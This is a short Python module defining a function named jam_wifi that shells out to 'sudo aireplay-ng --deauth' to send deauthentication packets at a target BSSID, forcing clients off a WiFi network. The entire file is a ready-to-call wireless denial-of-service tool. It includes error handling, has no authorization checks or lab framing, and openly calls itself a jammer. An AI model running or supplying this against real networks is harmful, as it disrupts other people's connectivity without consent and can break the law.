import subprocess
import platform
from typing import Dict, Any

def jam_wifi(bssid: str, interface: str = "wlan0", count: int = 10) -> Dict[str, Any]:
    """
    Send deauth packets to a WiFi network using aireplay-ng.
    Requires aircrack-ng installed and running with appropriate permissions.
    """
    if platform.system() != "Linux":
        return {"status": "error", "message": "Jammer only works on Linux with aircrack-ng"}
    
    try:
        cmd = ["sudo", "aireplay-ng", "--deauth", str(count), "-a", bssid, interface]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            return {"status": "success", "output": result.stdout}
        else:
            return {"status": "error", "output": result.stderr}
    except subprocess.TimeoutExpired:
        return {"status": "error", "message": "Command timed out"}
    except FileNotFoundError:
        return {"status": "error", "message": "aireplay-ng not found. Install aircrack-ng."}
    except PermissionError:
        return {"status": "error", "message": "Permission denied. Run with sudo."}